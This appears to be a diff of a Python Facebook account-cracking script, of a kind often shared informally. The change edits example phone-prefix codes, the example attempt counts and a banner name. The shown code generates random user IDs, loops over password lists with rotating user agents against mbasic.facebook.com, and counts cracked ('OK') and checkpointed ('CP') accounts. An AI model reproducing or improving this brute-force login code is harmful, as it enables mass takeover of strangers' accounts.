@@ -120,13 +120,13 @@ def fuck():
     user=[]
     os.system('clear')
     print(logo)
-    print('[+] EXAMPLE CODE: 017, 018, 019, 016')
+    print('[+] EXAMPLE CODE: 017, 013, 018, 019, 016')
     code = input('[?] CHOOSE CODE : ')
     name = ''.join(random.choice(string.digits) for _ in range(2))
     cod = ''.join(random.choice(string.digits) for _ in range(2))
     os.system('clear')
     print(logo)
-    print('[+] EXAMPLE: 2100 3500 5600 20000 ')
+    print('[+] EXAMPLE: 2000 5000 7000 10000 ')
     limit = int(input('[?] CHOOSE : '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(4))
@@ -158,7 +158,7 @@ def mumit2(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write('\r\033[1;92m[INNOCENT]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.write('\r\033[1;92m[AHAMEED]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
             sys.stdout.flush()
             free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
